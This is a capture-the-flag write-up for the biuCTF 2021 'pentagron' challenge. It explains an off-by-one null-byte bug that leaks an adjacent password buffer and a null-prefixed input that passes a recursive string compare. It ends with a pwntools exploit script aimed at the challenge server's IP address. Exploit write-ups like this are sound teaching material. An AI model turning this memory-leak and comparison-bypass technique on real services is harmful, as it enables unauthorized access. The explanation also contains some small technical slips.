# pentagron - biuCTF 2021

Let's connect to the server. We neet to enter a secret password to get get the flag. The server requests the password twice.
Now let's view the source code, the program gets the first input by:
```C
char secret[17];
char buf[16];
//load the password from the secret file!

char * line = NULL;
size_t len = 0;
ssize_t read;

FILE * fp = fopen("password.txt", "r");
fgets(secret_pass, 17, fp);
fclose(fp);
printf("Welcome to the Pentagon Network!\n");
printf("Please enter the secret passwword to continue:");
fgets(big_buf, 100, stdin);
// remove newline
big_buf[strcspn(big_buf, "\n")] = 0;
if(strlen(big_buf)>16){
    printf("Too many bytes entered!\n");
    exit(0);
}
sscanf(big_buf,"%16s",buf); 
strcpy(secret, secret_pass);
printf("You tried to log in with %s\n", buf);
```
The important thing to notice here is that we are limited to input of 16 characters, but the size of the buffer where our input is saved in is 16 charcters. Meaning that if we give input of 16 characters, the null byte will be at ```buf[17]```, which is ```secret[0]``` (```buf``` is located exactly after ```secret```). Since the user input is copied to ```buf``` before the password is copied to ```secret```, if we'll give a 16-char input, like ```AAAAAAAAAAAAAAAA```, the stack will look like this:
```
+-----+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+--------+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+----+
| buf |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   | secret |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |    |
+-----+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+--------+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+----+
| A   | A | A | A | A | A | A | A | A | A | A | A | A | A | A | A |   X    | X | X | X | X | X | X | X | X | X | X | X | X | X | X | X | \0 |
+-----+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+--------+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+----+
```
Where the x's are the secret password.
Let's try it:
```
Please enter the secret passwword to continue:AAAAAAAAAAAAAAAA
You tried to log in with AAAAAAAAAAAAAAAAsecreT_p4sssw0rd
lol what a noob. I'm nice so here's another try. Even though I don't think you'll succeed :)
```
So we know the password is secreT_p4sssw0rd! But just giving it as an input will not work because of the bug that overrides the input null byte.

Here is how the program gets the second input:
```C
sscanf(big_buf,"%16s",buf); 
strcpy(secret, secret_pass);
printf("You tried to log in with %s\n", buf);

if (super_secure_compare(buf, secret,16) == 0) {
    puts("Wow! how did u do it??\n");
    printf("here's the flag!\n");
    printFlag();
}
```
Now we write to buf after the password is already there. So if we give ```AAAAAAAAAAAAAAAA``` as an input the stack will look like:
````
+-----+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+--------+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+----+
| buf |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   | secret |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |    |
+-----+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+--------+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+----+
| A   | A | A | A | A | A | A | A | A | A | A | A | A | A | A | A |   \0   | e | c | r | e | T | _ | p | 4 | s | s | s | w | 0 | r | d | \0 |
+-----+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+--------+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+----+

````
So if we give input that starts with ```\0```, ```strlen(buf, secret)``` will return 0. But the program comares them using ```super_secure_compare```:
```C
int super_secure_compare(char* str1, char* str2,int size) {
	//let's compare N times the strings and its substrings, just to be certain!
	if (size == 0)
		return 0;
	return strcmp(str1, str2) || super_secure_compare(str1 + 1, str2 + 1, size - 1);
}
```
Because of this, we need to make sure not only ```buf``` and ```secret``` points to the same string, but also ```buf+i``` and ```secret+i``` will points to the same string for every i from 0 to 15.
Giving ```\0ecreT_p4sssw0rd``` as an input will do the work.
Here is python script to get the flag:
```python
from pwn import *

r = remote('34.118.43.143', 3000)
r.recvuntil('continue:')
r.sendline('A'*16)
r.recvuntil('ord:')
r.sendline('\0ecreT_p4sssw0rd')
print(r.recvall())
```
And we got it!
```
biuCTF{hex4gons_4_de_w1n}
```
